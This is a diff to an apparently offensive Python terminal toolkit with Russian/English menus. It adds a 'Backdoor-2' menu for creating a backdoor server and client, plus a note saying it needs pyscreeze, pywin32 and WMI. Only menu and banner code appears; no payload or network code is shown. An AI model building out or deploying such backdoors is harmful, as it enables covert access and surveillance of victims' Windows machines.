@@ -192,7 +192,7 @@ def DefSec4():
 		[1]-server (Создать)(Create)
 		[2]-client (Создать)(Create)\033[34m
 		\033[36m
-		[99]-Назад в главное меню(back to main menu)
+		[99]-Назад(back)
 		[0]-Выход(Exit)
 		\033[36m'''
 		print(text1)
@@ -302,9 +302,37 @@ my_backdoor.run() """)
 		elif bdv1 ==0:
 			Backdoor0()
 	def Backdoor2():
-		print("Скоро(soon)")
-		time.sleep(5)
-		DefSec4()
+		clean()
+		banner2 = '''
+	______            _       _                   _____ 
+	| ___ \          | |     | |                 / __  \
+	| |_/ / __ _  ___| | ____| | ___   ___ ______`' / /'
+	| ___ \/ _` |/ __| |/ / _` |/ _ \ / _ \______| / /  
+	| |_/ / (_| | (__|   < (_| | (_) | (_) |     ./ /___
+	\____/ \__,_|\___|_|\_\__,_|\___/ \___/      \_____/ '''
+		print(banner2)
+		text2 = ''' \033[34m
+		[1]-server (Создать)(Create)
+		[2]-client (Создать)(Create)\033[34m
+		[3]-Примечание к бэкдору(Backdoor note)
+		\033[36m
+		[99]-Назад(back)
+		[0]-Выход(Exit)
+		\033[36m'''
+		print(text2)
+                bdv2 = int(input('\033[31mBackdoor\033[39m~#:')) 
+		def Backdoor0():
+			print("\033[39mПрощайте!(Goodbye!)")
+			raise SystemExit
+		def Backdoor99():
+			DefSec4()
+		def Backdoor3():
+			textb = '''
+			Необходимо установить pyscreeze pywin32 WMI черeз pip
+			(You need to install pyscreeze pywin32 WMI through pip)'''
+			
+			print(textb)
+			
 	def Backdoor3():
 		text = ''' \033[33m
 Рус-RU
